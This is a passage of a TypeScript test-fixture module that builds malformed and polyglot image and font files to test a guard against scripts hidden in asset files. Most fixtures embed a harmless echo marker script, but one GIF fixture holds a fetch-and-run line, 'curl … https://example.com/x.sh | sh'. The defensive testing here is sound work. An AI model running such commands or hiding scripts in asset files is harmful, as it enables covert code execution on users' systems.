  oddChunk[oddChunk.length - 1] = 0x23;
  // BMP: a gap between the header and the rows that holds the payload.
  const gapBmp = Buffer.concat([bmp().subarray(0, 54), payload, bmp().subarray(54)]);
  gapBmp.writeUInt32LE(gapBmp.length, 2);
  gapBmp.writeUInt32LE(54 + payload.length, 10);
  // WOFF and WOFF2: a metadata block that is not the compressed stream it says it is; a WOFF2 collection.
  const metadataWoff = woff({ metadata: '<?xml version="1.0"?><metadata version="1.0"/>' });
  payload.copy(metadataWoff, metadataWoff.readUInt32BE(24), 0, Math.min(payload.length, metadataWoff.readUInt32BE(28)));
  metadataWoff[metadataWoff.readUInt32BE(24)] = 0;
  const collection = woff2();
  collection.write("ttcf", 4, "latin1");
  // A font with a second table whose tag is not printable.
  const head = headTable();
  const tagTtf = Buffer.concat([
    u32be(0x00010000),
    u16be(2),
    u16be(32),
    u16be(1),
    u16be(0),
    Buffer.from([1, 2, 3, 4]),
    u32be(0),
    u32be(44),
    u32be(4),
    Buffer.from("head", "latin1"),
    u32be(0),
    u32be(48),
    u32be(head.length),
    Buffer.alloc(4),
    padded(head),
  ]);
  // Each format laid out in full with bytes after its end, and cut short.
  const ends: Array<[string, Buffer]> = [];
  for (const [name, bytes] of Object.entries(exemptShapes())) {
    if (!name.startsWith("a.") || name === "a.jpeg" || name === "a.otf") continue;
    const extension = name.slice(2);
    ends.push([`after-end.${extension}`, Buffer.concat([bytes, Buffer.from(";run();\n")])], [`cut-short.${extension}`, bytes.subarray(0, bytes.length - 4)]);
  }
  // A PNG chunk whose CRC does not match, and a chunk after IEND.
  const badCrc = png();
  badCrc[17] = (badCrc[17] ?? 0) ^ 1;
  // WOFF2: bytes after the brotli stream inside its stated size, and a stream shorter than the tables.
  const streamTail = Buffer.concat([woff2(), Buffer.from("tail")]);
  streamTail.writeUInt32BE(streamTail.length, 8);
  streamTail.writeUInt32BE(streamTail.readUInt32BE(20) + 4, 20);
  const shortStream = brotliCompressSync(head.subarray(0, 50));
  const streamShort = Buffer.concat([woff2().subarray(0, 50), shortStream]);
  streamShort.writeUInt32BE(streamShort.length, 8);
  streamShort.writeUInt32BE(shortStream.length, 20);
  // EOT: XOR-obfuscated data that is no font once the XOR is undone (its head magic is not).
  const scrambled = eot({ xor: true });
  const magic = scrambled.length - ttf().length + 28 + 12;
  scrambled[magic] = (scrambled[magic] ?? 0) ^ 0xff;
  // AVIF: mdat bytes no item holds; BMP: a header that does not describe the pixels.
  const uncovered = avif(Buffer.concat([Buffer.alloc(4, 7), padded(payload)]), { extents: [[0, 4]] });
  const wide = bmp8();
  wide.writeInt32LE(5, 18);
  return Object.fromEntries([
    ...ends,
    ["crc.png", badCrc],
    ["after-iend.png", Buffer.concat([png(), pngChunk("tEXt", Buffer.from("k\0v"))])],
    ["zlib-tail.woff", woff({ table: Buffer.concat([deflateSync(head), Buffer.from("tail")]) })],
    ["inflates-short.woff", woff({ table: deflateSync(head.subarray(0, 50)) })],
    ["stream-tail.woff2", streamTail],
    ["stream-short.woff2", streamShort],
    ["scrambled.eot", scrambled],
    ["uncovered.avif", uncovered],
    ["free-box.avif", Buffer.concat([avif(), box("free", payload)])],
    ["wide.bmp", wide],
    // AVIF item properties: the payload past each fixed size, each bounded part, and each reserved field.
    property("ispe-size", fullBox("ispe", 0, Buffer.concat([u32s(1, 1), payload]))),
    property("pixi-size", fullBox("pixi", 0, Buffer.concat([Buffer.from([1, 8]), payload]))),
    property("av1C-bound", box("av1C", Buffer.concat([Buffer.from([0x81, 0x00, 0x0c, 0x00]), long]))),
    property("av1C-marker", box("av1C", Buffer.from([0x01, 0x00, 0x0c, 0x00]))),
    property("av1C-reserved", box("av1C", Buffer.from([0x81, 0x00, 0x0c, 0xe0]))),
    property("nclx-size", box("colr", Buffer.concat([Buffer.from("nclx", "latin1"), Buffer.from([0, 1, 0, 13, 0, 6, 0x80]), payload]))),
    property("nclx-reserved", box("colr", Buffer.from([...Buffer.from("nclx", "latin1"), 0, 1, 0, 13, 0, 6, 0x81]))),
    property("icc-short", box("colr", Buffer.concat([Buffer.from("prof", "latin1"), u32be(40 + payload.length), Buffer.alloc(32), Buffer.from("acsp", "latin1"), payload]))),
    property("icc-size", box("colr", Buffer.concat([Buffer.from("prof", "latin1"), iccHeader(132), payload]))),
    property("icc-signature", box("colr", Buffer.concat([Buffer.from("prof", "latin1"), iccHeader(132 + payload.length, "\0\0\0\0"), payload]))),
    property("pasp-size", box("pasp", Buffer.concat([u32s(1, 1), payload]))),
    property("clap-size", box("clap", Buffer.concat([u32s(1, 1, 1, 1, 0, 1, 0, 1), payload]))),
    property("irot-size", box("irot", Buffer.concat([Buffer.from([1]), payload]))),
    property("irot-reserved", box("irot", Buffer.from([0x04]))),
    property("imir-size", box("imir", Buffer.concat([Buffer.from([0]), payload]))),
    property("imir-reserved", box("imir", Buffer.from([0x02]))),
    property("lsel-size", box("lsel", Buffer.concat([Buffer.from([0, 0]), payload]))),
    property("a1op-size", box("a1op", Buffer.concat([Buffer.from([0]), payload]))),
    property("a1lx-size", box("a1lx", Buffer.concat([Buffer.from([0, 0, 1, 0, 2, 0, 3]), payload]))),
    property("a1lx-reserved", box("a1lx", Buffer.from([0x02, 0, 1, 0, 2, 0, 3]))),
    property("clli-size", box("clli", Buffer.concat([Buffer.from([0, 100, 0, 50]), payload]))),
    property("mdcv-size", box("mdcv", Buffer.concat([Buffer.alloc(24, 1), payload]))),
    property("auxC-subtype", fullBox("auxC", 0, Buffer.concat([alpha, long]))),
    property("auxC-type", fullBox("auxC", 0, Buffer.concat([repeated(script, 300), Buffer.from([0])]))),
    property("auxC-version", fullBox("auxC", 1, alpha)),
    // AVIF strings, ftyp, hdlr and pitm: long printable text, a string that is not printable, too
    // many strings, a protected item, and bytes in fields that must be zero or end the box.
    ["long-hdlr-name.avif", avif(undefined, { name: Buffer.concat([repeated(script, 2000), Buffer.from([0])]) })],
    ["long-item-name.avif", avif(undefined, { items: [infe(2, "Exif", `${repeated(script, 2000).toString("latin1")}\0`)] })],
    ["item-strings.avif", avif(undefined, { items: [infe(2, "Exif", "#!/bin/sh\0echo MARKER-PAYLOAD\0")] })],
    ["item-unprintable.avif", avif(undefined, { items: [infe(2, "Exif", "#!/bin/sh\necho MARKER-PAYLOAD\n\0")] })],
    ["item-type.avif", avif(undefined, { items: [infe(2, "\x01\x02\x03\x04", "\0")] })],
    ["item-protected.avif", avif(undefined, { items: [infe(2, "Exif", "\0", 0, 1)] })],
    ["long-ftyp.avif", avif(undefined, { ftyp: Buffer.concat([Buffer.from("avif\0\0\0\0avif", "latin1"), repeated(script, 2000)]) })],
    ["ftyp-brands.avif", avif(undefined, { ftyp: Buffer.concat([Buffer.from("avif\0\0\0\0avif", "latin1"), padded(payload)]) })],
    ["hdlr-reserved.avif", avif(undefined, { hdlr: Buffer.concat([u32be(0), Buffer.from("pict", "latin1"), repeated(script, 12), Buffer.from("Picture\0", "latin1")]) })],
    ["hdlr-predefined.avif", avif(undefined, { hdlr: Buffer.concat([repeated(script, 4), Buffer.from("pict", "latin1"), Buffer.alloc(12), Buffer.from("Picture\0", "latin1")]) })],
    ["pitm-tail.avif", avif(undefined, { pitm: Buffer.concat([u16be(1), payload]) })],
    // AVIF boxes: an unknown box in meta, a second idat, unknown reference and group types, extra
    // entries, a data reference not in this file, a counted list that is longer or shorter than its
    // count, a box other than ipma after ipco, and bytes after iloc's or ipma's entries.
    ["box-in-meta.avif", avif(undefined, { meta: [box("free", payload)] })],
    ["second-idat.avif", avif(undefined, { meta: [box("idat", payload), box("idat", Buffer.alloc(0))] })],
    ["iref-type.avif", avif(undefined, { meta: [fullBox("iref", 0, itemReference("xxxx", 1, [1]))] })],
    ["iref-extra.avif", avif(undefined, { meta: [fullBox("iref", 0, box("cdsc", Buffer.concat([u16be(1), u16be(1), u16be(1), u16be(1)])))] })],
    ["grpl-type.avif", avif(undefined, { meta: [box("grpl", fullBox("xxxx", 0, u32s(5, 1, 1)))] })],
    ["grpl-extra.avif", avif(undefined, { meta: [box("grpl", fullBox("altr", 0, u32s(5, 1, 1, 1)))] })],
    ["url-elsewhere.avif", avif(undefined, { meta: [box("dinf", dref(1, [fullBox("url ", 0, Buffer.alloc(0), 0)]))] })],
    ["dinf-extra.avif", avif(undefined, { meta: [box("dinf", Buffer.concat([dref(1, [selfContained]), box("free", payload)]))] })],
    ["dref-count.avif", avif(undefined, { meta: [box("dinf", dref(2, [selfContained]))] })],
    ["iinf-count.avif", iinfCount],
    ["iprp-box.avif", avif(undefined, { ipma: [fullBox("xxxx", 0, u32be(0))] })],
    ["ipma-tail.avif", avif(undefined, { ipma: [fullBox("ipma", 0, Buffer.concat([u32be(0), payload]))] })],
    ["iloc-tail.avif", avif(undefined, { ilocTail: payload })],
    // JPEG: a segment under the JPG marker, a reserved marker low and high, and a restart marker.
    ["jpg-marker.jpg", jpeg([jpegSegment(0xc8, payload)])],
    ["reserved-low.jpg", jpeg([jpegSegment(0x02, payload)])],
    ["reserved-high.jpg", jpeg([jpegSegment(0xbf, payload)])],
    ["restart.jpg", jpeg([jpegSegment(0xd0, payload)])],
    // EOT: a root string far longer than any font's, a name of an odd size, and non-zero padding,
    // reserved words or EUDC fields; and plain data flagged as compressed.
    ["long-root.eot", eot({ v22: { root: repeated(script, 2000) } })],
    ["odd-name.eot", eot({ names: [Buffer.concat([payload, Buffer.alloc(1 - (payload.length % 2), 0x23)])] })],
    ["padding.eot", paddingEot],
    ["reserved.eot", reservedEot],
    ["eudc-fields.eot", eudcEot],
    ["mtx-flag.eot", mtxEot],
    // PNG and WebP.
    ["long-ihdr.png", longIhdr],
    ["second-ihdr.png", png([pngChunk("IHDR", payload)])],
    ["iend-data.png", iendData],
    ["odd-pad.webp", webp([oddChunk])],
    // WOFF and WOFF2, a bitmap, an icon and a font.
    ["private-overlap.woff", privateWoff],
    ["private-overlap.woff2", privateWoff2],
    ["reserved.woff", reservedWoff],
    ["reserved.woff2", reservedWoff2],
    ["metadata.woff", metadataWoff],
    ["metadata.woff2", woff2({ metadata: { block: padded(payload), original: 100 } })],
    ["collection.woff2", collection],
    ["gap.bmp", gapBmp],
    ["profile.bmp", profileBmp],
    ["reserved.ico", reservedIco],
    ["tag.ttf", tagTtf],
  ]);
}

/** `bytes` with `data` written at `at` (a copy). */
function patched(bytes: Buffer, at: number, data: Buffer | readonly number[]): Buffer {
  const out = Buffer.from(bytes);
  Buffer.from(data).copy(out, at);
  return out;
}

/** `bytes` with the big-endian (or, with `le`, little-endian) 32-bit `value` at `at` (a copy). */
function withU32(bytes: Buffer, at: number, value: number, le = false): Buffer {
  return patched(bytes, at, le ? u32le(value) : u32be(value));
}

/** An sfnt with `records` (tag, offset, length) and `body` right after its directory. */
function sfnt(records: ReadonlyArray<readonly [string | Buffer, number, number]>, body: Buffer, version: Buffer = u32be(0x00010000)): Buffer {
  const directory = records.map(([tag, offset, length]) => Buffer.concat([typeof tag === "string" ? Buffer.from(tag, "latin1") : tag, u32be(0), u32be(offset), u32be(length)]));
  return Buffer.concat([version, u16be(records.length), u16be(0), u16be(0), u16be(0), ...directory, body]);
}

/** A WOFF with `tables` (tag and stored bytes, uncompressed), each padded to four bytes, its length field the file's. */
function woffOf(tables: ReadonlyArray<readonly [string | Buffer, Buffer]>): Buffer {
  const header = Buffer.alloc(44);
  header.write("wOFF", 0, "latin1");
  header.writeUInt32BE(0x00010000, 4);
  header.writeUInt16BE(tables.length, 12);
  let at = 44 + 20 * tables.length;
  const entries: Buffer[] = [];
  for (const [tag, data] of tables) {
    entries.push(Buffer.concat([typeof tag === "string" ? Buffer.from(tag, "latin1") : tag, u32be(at), u32be(data.length), u32be(data.length), u32be(0)]));
    at += padded(data).length;
  }
  const file = Buffer.concat([header, ...entries, ...tables.map(([, data]) => padded(data))]);
  file.writeUInt32BE(file.length, 8);
  return file;
}

/** A WOFF2 with `tables` directory entries (`directory`) and one brotli stream of `font`, its length field the file's. */
function woff2Of(tables: number, directory: Buffer, font: Buffer): Buffer {
  const stream = brotliCompressSync(font);
  const header = Buffer.alloc(48);
  header.write("wOF2", 0, "latin1");
  header.writeUInt32BE(0x00010000, 4);
  header.writeUInt16BE(tables, 12);
  header.writeUInt32BE(stream.length, 20);
  const file = Buffer.concat([header, directory, stream]);
  file.writeUInt32BE(file.length, 8);
  return file;
}

/** A WebP holding `chunks`, its RIFF size the file's. */
function webpOf(chunks: Buffer[]): Buffer {
  const body = Buffer.concat(chunks);
  return Buffer.concat([Buffer.from("RIFF", "latin1"), u32le(4 + body.length), Buffer.from("WEBP", "latin1"), body]);
}

/** A BMP from its fields: a BITMAPINFOHEADER-style header of `headerSize` bytes, masks, palette and rows, its size field the file's. */
function bmpOf(o: { headerSize?: number; width?: number; height?: number; planes?: number; bits?: number; compression?: number; used?: number; masks?: Buffer; palette?: Buffer; rows?: Buffer; offset?: number; size?: number; magic?: string; tail?: Buffer } = {}): Buffer {
  const headerSize = o.headerSize ?? 40;
  const info = Buffer.alloc(headerSize);
  info.writeUInt32LE(headerSize, 0);
  info.writeInt32LE(o.width ?? 1, 4);
  info.writeInt32LE(o.height ?? 1, 8);
  info.writeUInt16LE(o.planes ?? 1, 12);
  info.writeUInt16LE(o.bits ?? 24, 14);
  info.writeUInt32LE(o.compression ?? 0, 16);
  info.writeUInt32LE(o.used ?? 0, 32);
  if (headerSize > 40) info.write("#!sh", 40, "latin1");
  const header = Buffer.concat([info, o.masks ?? Buffer.alloc(0), o.palette ?? Buffer.alloc(0)]);
  const file = Buffer.concat([Buffer.from(o.magic ?? "BM", "latin1"), u32le(0), Buffer.alloc(4), u32le(o.offset ?? 14 + header.length), header, o.rows ?? Buffer.from([0, 0, 0xff, 0])]);
  file.writeUInt32LE(o.size ?? file.length, 2);
  return file;
}

/**
 * Files laid out as a format that are still never exempt under their name: one format's bytes under
 * another format's extension (an image's under another image's, a font's under an image's), and under
 * a name with no extension at all that spells one.
 */
export function misnamed(): Record<string, Buffer> {
  return { "png-bytes.gif": png(), "gif-bytes.png": gif(), "woff-bytes.ttf": woff(), "png-bytes.jpg": png(), "ttf-bytes.png": ttf(), png: png() };
}

/**
 * One shape for each condition of the walks that the mutation pass (test/content-guards.test.ts)
 * found no other shape holds: with that condition taken out of content.ts, its shape passes, or the
 * walk throws or never ends on it (which fails the tests as surely). Each passes every other check,
 * but for the `-null-version` shapes: a full box whose flags fullBoxVersion refuses (so its version
 * is null) laid out as the version that is not 0, which holds the check that refuses a null version;
 * each box's own flags are held by `perField`.
 */
function perCondition(): Record<string, Buffer> {
  const script = Buffer.from("#!/bin/sh\necho MARKER-PAYLOAD\nexit 0\n", "latin1");
  const words16 = (bytes: Buffer): Buffer => padded(bytes).subarray(0, bytes.length + (bytes.length % 2));
  const scriptIds16 = words16(script);
  const scriptIds32 = padded(script);
  const u32s = (...values: number[]): Buffer => Buffer.concat(values.map((value) => u32be(value)));
  const selfContained = fullBox("url ", 0, Buffer.alloc(0), 1);
  const ispe = fullBox("ispe", 0, u32s(1, 1));
  const ipma = fullBox("ipma", 0, Buffer.concat([u32be(1), u16be(1), Buffer.from([1, 0x81])]));
  const idat = box("idat", Buffer.from([1, 2, 3, 4]));
  // iloc boxes for items whose data starts at `offset` (mdat's body).
  const iloc0 = (body: Buffer): ((offset: number) => Buffer) => () => fullBox("iloc", 0, body);
  const inMdat = (version: number, fields: (offset: number) => Buffer, flags = 0): ((offset: number) => Buffer) => (offset) => fullBox("iloc", version, fields(offset), flags);
  const second = infe(2, "Exif", "\0");
  const head = headTable();
  const noMagic = patched(head, 12, [0, 0, 0, 0]);
  const shortHead = patched(Buffer.alloc(16), 12, u32be(0x5f0f3cf5));
  const offMagic = patched(Buffer.alloc(16), 11, u32be(0x5f0f3cf5));
  const image = png();
  const ihdr = (width: number, height: number): Buffer => pngChunk("IHDR", Buffer.concat([u32be(width), u32be(height), Buffer.from([8, 0, 0, 0, 0])]));
  const idatChunk = image.subarray(33, image.length - 12);
  const iend = image.subarray(image.length - 12);
  const signature = image.subarray(0, 8);
  const j = jpeg();
  const [soi, app0, sof0, sos, scanData, eoi] = [j.subarray(0, 2), j.subarray(2, 20), j.subarray(20, 33), j.subarray(33, 43), j.subarray(43, 51), j.subarray(51)];
  const g = gif();
  const ico1 = icoBitmap();
  const topDown = patched(ico1, 0, []);
  topDown.writeInt32LE(-2, 8);
  topDown.fill(0, 40);
  const odd = Buffer.concat([ico1.subarray(0, 40), Buffer.from([1, 2, 3, 0xff, 0, 0, 0, 0, 4, 5, 6, 0xff])]);
  odd.writeInt32LE(3, 8);
  const many = Array.from({ length: 256 }, () => png());
  const manyIco = Buffer.concat([
    Buffer.from([0, 0, 1, 0]),
    u16le(256),
    ...many.map((entry, index) => Buffer.concat([Buffer.from([1, 1, 0, 0, 1, 0, 32, 0]), u32le(entry.length), u32le(6 + 16 * 256 + index * entry.length)])),
    ...many,
  ]);
  const manyRecords: Array<[string, number, number]> = [];
  const directory = 12 + 16 * 513;
  for (let i = 0; i < 512; i++) manyRecords.push([`t${String(i).padStart(3, "0")}`, directory + 4 * i, 4]);
  manyRecords.push(["head", directory + 4 * 512, head.length]);
  const eot22 = eot({ v22: {} });
  const v21 = Buffer.concat([eot().subarray(0, 96), Buffer.alloc(4), eot().subarray(96)]);
  v21.writeUInt32LE(v21.length, 0);
  v21.writeUInt32LE(0x00020005, 8);
  const eotShort = Buffer.alloc(82);
  eotShort.writeUInt32LE(82, 0);
  eotShort.writeUInt32LE(0x00010000, 8);
  eotShort.writeUInt16LE(0x504c, 34);
  const eudcShort = Buffer.from(eot22.subarray(0, 114));
  eudcShort.writeUInt32LE(114, 0);
  eudcShort.writeUInt32LE(0, 4);
  const woffHeader = Buffer.alloc(44);
  woffHeader.write("wOFF", 0, "latin1");
  woffHeader.writeUInt32BE(44, 8);
  woffHeader.writeUInt16BE(1, 12);
  const gapped = (font: Buffer): Buffer => {
    const out = Buffer.concat([font, Buffer.alloc(4), script]);
    out.writeUInt32BE(out.length, 8);
    return out;
  };
  return {
    // Shared helpers: a signature, the gaps, padding and overlaps between blocks, a string's end and bytes.
    "signature.png": Buffer.concat([script.subarray(0, 8), image.subarray(8)]),
    "overlap.ttf": sfnt([["head", 44, head.length], ["blob", 44, 4]], padded(head)),
    "zero-gap.ttf": sfnt([["head", 36, head.length]], Buffer.concat([Buffer.alloc(8), padded(head)])),
    "pad.ttf": sfnt([["head", 44, head.length], ["blob", 100, 4]], Buffer.concat([head, Buffer.from("#!"), Buffer.from([1, 2, 3, 4])])),
    "zero-tail.ttf": Buffer.concat([ttf(), Buffer.alloc(4)]),
    "tail-pad.ttf": patched(ttf(), ttf().length - 2, Buffer.from("#!")),
    "item-unterminated.avif": avif(undefined, { items: [infe(2, "Exif", "abc")] }),
    "item-high.avif": avif(undefined, { items: [infe(2, "Exif", "caf\xe9\0")] }),
    // PNG.
    "chunk-past-end.png": withU32(image, image.length - 12, 4),
    "chunk-type.png": png([pngChunk("#!sh", script)]),
    "first-chunk.png": Buffer.concat([signature, pngChunk("tEXt", script.subarray(0, 13)), idatChunk, iend]),
    "zero-width.png": Buffer.concat([signature, ihdr(0, 1), idatChunk, iend]),
    "zero-height.png": Buffer.concat([signature, ihdr(1, 0), idatChunk, iend]),
    "no-idat.png": Buffer.concat([signature, ihdr(1, 1), iend]),
    // JPEG.
    "soi.jpg": patched(j, 0, Buffer.from("#!")),
    "no-ff.jpg": jpeg([Buffer.concat([Buffer.from([0xfe]), u16be(2 + script.length), script])]),
    "no-scan.jpg": Buffer.concat([soi, app0, sof0, eoi]),
    "scan-first.jpg": Buffer.concat([soi, app0, sos, scanData, sof0, eoi]),
    "marker-at-end.jpg": Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00]),
    "sos-length.jpg": Buffer.concat([soi, app0, sof0, Buffer.from([0xff, 0xda, 0, 0]), scanData, eoi]),
    "scan-unterminated.jpg": Buffer.concat([soi, app0, sof0, sos, Buffer.from([0x12, 0x34, 0x00])]),
    // A reserved marker (JPG, 0xC8) inside the entropy-coded data, which only a restart may be.
    "scan-reserved.jpg": Buffer.concat([soi, app0, sof0, sos, Buffer.from([0x12, 0xff, 0xc8, 0x34]), eoi]),
    // GIF.
    "header.gif": patched(g, 0, Buffer.from("#!/bin")),
    "no-image.gif": Buffer.concat([g.subarray(0, 27), Buffer.from([0x3b])]),
    "code-size-low.gif": patched(g, 37, [1]),
    "code-size-high.gif": patched(g, 37, [9]),
    // After the image, bytes of no block type (a script with no "!", "," or ";" byte), then the trailer.
    "block-kind.gif": Buffer.concat([g.subarray(0, g.length - 1), Buffer.from("\ncurl -fsSL https://example.com/x.sh | sh\necho MARKER-PAYLOAD\n", "latin1"), Buffer.from([0x3b])]),
    // WebP.
    "riff.webp": patched(webp(), 0, Buffer.from("#!sh")),
    "form.webp": patched(webp(), 8, Buffer.from("#!sh")),
    "riff-size.webp": patched(webp(), 4, script.subarray(0, 4)),
    "chunk-header-short.webp": webpOf([riffChunk("VP8L", Buffer.from([0x2f, 0, 0, 0, 0])), Buffer.from("EXIF\0", "latin1")]),
    "first-chunk.webp": webpOf([riffChunk("EXIF", Buffer.from("Exif\0\0MM\0*")), riffChunk("VP8L", Buffer.from([0x2f, 0, 0, 0, 0]))]),
    "vp8-short.webp": webpOf([riffChunk("VP8 ", Buffer.from([0, 0, 0, 0x9d, 0x01, 0x2a, 0, 0, 0]))]),
    "vp8-code.webp": webpOf([riffChunk("VP8 ", Buffer.concat([Buffer.alloc(3), script.subarray(0, 7)]))]),
    "vp8l-short.webp": webpOf([riffChunk("VP8L", Buffer.from([0x2f]))]),
    "vp8l-signature.webp": webpOf([riffChunk("VP8L", Buffer.from([0x23, 0, 0, 0, 0]))]),
    "no-image.webp": webpOf([riffChunk("VP8X", Buffer.alloc(10))]),
    // AVIF: boxes, ftyp and the top level.
    "box-tail.avif": Buffer.concat([avif(), Buffer.from([0])]),
    "large-short.avif": Buffer.concat([avif(), u32be(1), Buffer.from("mdat", "latin1")]),
    "iref-empty.avif": avif(undefined, { meta: [box("iref", Buffer.from([0, 0])), box("idat", Buffer.alloc(0))] }),
    "ftyp-type.avif": patched(avif(), 4, Buffer.from("blob")),
    "ftyp-large.avif": avif(undefined, { ftypBox: Buffer.concat([u32be(1), Buffer.from("ftyp", "latin1"), u32be(0), u32be(32), Buffer.from("avif\0\0\0\0avifmif1", "latin1")]) }),
    "ftyp-short.avif": avif(undefined, { ftypBox: box("ftyp", Buffer.from("avif", "latin1")) }),
    "ftyp-brand.avif": avif(undefined, { ftyp: Buffer.from("mif1\0\0\0\0mif1miaf", "latin1") }),
    "two-meta.avif": Buffer.concat([avif(), box("meta", script)]),
    // AVIF: meta, hdlr and pitm.
    "meta-version.avif": patched(avif(), 32, [1]),
    "meta-children.avif": Buffer.concat([box("ftyp", Buffer.from("avif\0\0\0\0avifmif1", "latin1")), fullBox("meta", 0, Buffer.from([0, 0, 0])), box("mdat", Buffer.from([1, 2, 3, 4]))]),
    "hdlr-second.avif": avif(undefined, { children: (boxes) => [boxes[1] ?? Buffer.alloc(0), boxes[0] ?? Buffer.alloc(0), ...boxes.slice(2)] }),
    "no-pitm.avif": avif(undefined, { children: (boxes) => boxes.filter((_, index) => index !== 1) }),
    "no-iloc.avif": avif(undefined, { children: (boxes) => boxes.filter((_, index) => index !== 2) }),
    "no-iinf.avif": avif(undefined, { children: (boxes) => boxes.filter((_, index) => index !== 3) }),
    "no-iprp.avif": avif(undefined, { children: (boxes) => boxes.filter((_, index) => index !== 4) }),
    "hdlr-version.avif": patched(avif(), 44, [1]),
    "hdlr-type.avif": avif(undefined, { hdlr: Buffer.concat([u32be(0), Buffer.from("#!sh", "latin1"), Buffer.alloc(12), Buffer.from("Picture\0", "latin1")]) }),
    "pitm-null-version.avif": avif(undefined, { children: (boxes) => [boxes[0] ?? Buffer.alloc(0), fullBox("pitm", 0, u32be(1), 1), ...boxes.slice(2)] }),
    "pitm-version.avif": avif(undefined, { children: (boxes) => [boxes[0] ?? Buffer.alloc(0), fullBox("pitm", 2, u32be(1)), ...boxes.slice(2)] }),
    "pitm-item.avif": avif(undefined, { pitm: u16be(7) }),
    "no-extents.avif": avif(Buffer.alloc(0), { iloc: iloc0(Buffer.concat([u16be(0x4400), u16be(0)])) }),
    "idat-uncovered.avif": avif(undefined, { meta: [box("idat", script)] }),
    // AVIF: item references, data references and entity groups.
    "iref-null-version.avif": avif(undefined, { meta: [fullBox("iref", 0, box("cdsc", Buffer.concat([u32be(1), u16be(1), u32be(1)])), 1)] }),
    "iref-version.avif": avif(undefined, { meta: [fullBox("iref", 2, box("cdsc", Buffer.concat([u32be(1), u16be(1), u32be(1)])))] }),
    "iref-children.avif": avif(undefined, { meta: [fullBox("iref", 0, Buffer.from([0, 0, 0]))] }),
    "iref-count.avif": avif(undefined, { meta: [fullBox("iref", 0, box("cdsc", Buffer.concat([u16be(1), u16be(0)])))] }),
    "iref-from.avif": avif(undefined, { meta: [fullBox("iref", 0, itemReference("cdsc", 9, [1]))] }),
    "iref-to.avif": avif(undefined, { meta: [fullBox("iref", 0, box("cdsc", Buffer.concat([u16be(1), u16be(scriptIds16.length / 2), scriptIds16])))] }),
    "dinf-child.avif": avif(undefined, { meta: [box("dinf", fullBox("xxxx", 0, Buffer.concat([u32be(1), selfContained])))] }),
    "dref-version.avif": avif(undefined, { meta: [box("dinf", fullBox("dref", 1, Buffer.concat([u32be(1), selfContained])))] }),
    "dref-entries.avif": avif(undefined, { meta: [box("dinf", fullBox("dref", 0, Buffer.concat([u32be(1), Buffer.from([0, 0, 0])])))] }),
    "dref-empty.avif": avif(undefined, { meta: [box("dinf", fullBox("dref", 0, u32be(0)))] }),
    "dref-urn.avif": avif(undefined, { meta: [box("dinf", fullBox("dref", 0, Buffer.concat([u32be(1), fullBox("urn ", 0, Buffer.alloc(0), 1)])))] }),
    "url-version.avif": avif(undefined, { meta: [box("dinf", fullBox("dref", 0, Buffer.concat([u32be(1), fullBox("url ", 1, Buffer.alloc(0), 1)])))] }),
    "grpl-children.avif": avif(undefined, { meta: [box("grpl", Buffer.from([0, 0, 0]))] }),
    "grpl-version.avif": avif(undefined, { meta: [box("grpl", fullBox("altr", 1, u32s(5, 1, 1)))] }),
    "grpl-entities.avif": avif(undefined, { meta: [box("grpl", fullBox("altr", 0, Buffer.concat([u32s(5, scriptIds32.length / 4), scriptIds32])))] }),
    // AVIF: items.
    "iinf-null-version.avif": avif(undefined, { iinf: fullBox("iinf", 0, Buffer.concat([u32be(1), infe(1, "av01", "Color\0")]), 1) }),
    "iinf-version.avif": avif(undefined, { iinf: fullBox("iinf", 2, Buffer.concat([u32be(1), infe(1, "av01", "Color\0")])) }),
    "iinf-entries.avif": avif(undefined, { iinf: fullBox("iinf", 0, Buffer.concat([u16be(1), Buffer.from([0, 0, 0])])) }),
    "iinf-box.avif": avif(undefined, { items: [fullBox("blob", 2, Buffer.concat([u16be(2), u16be(0), Buffer.from("Exif\0", "latin1")]))] }),
    "infe-version.avif": avif(undefined, { items: [fullBox("infe", 1, Buffer.concat([u32be(2), u16be(0), Buffer.from("Exif\0", "latin1")]))] }),
    "mime-strings.avif": avif(undefined, { items: [infe(2, "mime", "a\0b\0c\0d\0")] }),
    "item-duplicate.avif": avif(undefined, { items: [infe(1, "Exif", "\0")] }),
    // AVIF: item locations.
    "iloc-null-version.avif": avif(undefined, { iloc: inMdat(0, (o) => Buffer.concat([u16be(0x4400), u16be(1), u16be(1), u16be(0), u16be(0), u16be(1), u32s(o, 4)]), 1) }),
    "iloc-version.avif": avif(undefined, { iloc: inMdat(3, (o) => Buffer.concat([u16be(0x4400), u32be(1), u32be(1), u16be(0), u16be(0), u16be(1), u32s(o, 4)])) }),
    "iloc-index.avif": avif(undefined, { iloc: inMdat(1, (o) => Buffer.concat([u16be(0x4408), u16be(1), u16be(1), u16be(0), u16be(0), u16be(1), u32s(0x100, 0), u32s(o, 4)])) }),
    "iloc-reserved.avif": avif(undefined, { iloc: inMdat(0, (o) => Buffer.concat([u16be(0x4401), u16be(1), u16be(1), u16be(0), u16be(1), u32s(o, 4)])) }),
    "iloc-sizes.avif": avif(undefined, { iloc: inMdat(0, (o) => Buffer.concat([u16be(0x2200), u16be(1), u16be(1), u16be(0), u16be(1), u16be(o), u16be(4)])) }),
    "iloc-item.avif": avif(undefined, { iloc: inMdat(0, (o) => Buffer.concat([u16be(0x4400), u16be(1), u16be(7), u16be(0), u16be(1), u32s(o, 4)])) }),
    "iloc-twice.avif": avif(Buffer.alloc(8, 7), { iloc: inMdat(0, (o) => Buffer.concat([u16be(0x4400), u16be(2), u16be(1), u16be(0), u16be(1), u32s(o, 4), u16be(1), u16be(0), u16be(1), u32s(o + 4, 4)])) }),
    "iloc-method.avif": avif(Buffer.alloc(0), { meta: [idat], iloc: () => fullBox("iloc", 1, Buffer.concat([u16be(0x4400), u16be(1), u16be(1), u16be(2), u16be(0), u16be(1), u32s(0, 4)])) }),
    "iloc-base.avif": avif(Buffer.alloc(0), { meta: [idat], iloc: () => fullBox("iloc", 1, Buffer.concat([u16be(0x0480), u16be(1), u16be(1), u16be(1), u16be(0), u16be(1), u32be(4)])) }),
    "iloc-no-extent-count.avif": avif(undefined, { items: [second], iloc: inMdat(0, (o) => Buffer.concat([u16be(0x4400), u16be(2), u16be(1), u16be(0), u16be(1), u32s(o, 4), u16be(2), u16be(0)])) }),
    "iloc-zero-extents.avif": avif(undefined, { items: [second], iloc: inMdat(0, (o) => Buffer.concat([u16be(0x4400), u16be(2), u16be(1), u16be(0), u16be(1), u32s(o, 4), u16be(2), u16be(0), u16be(0)])) }),
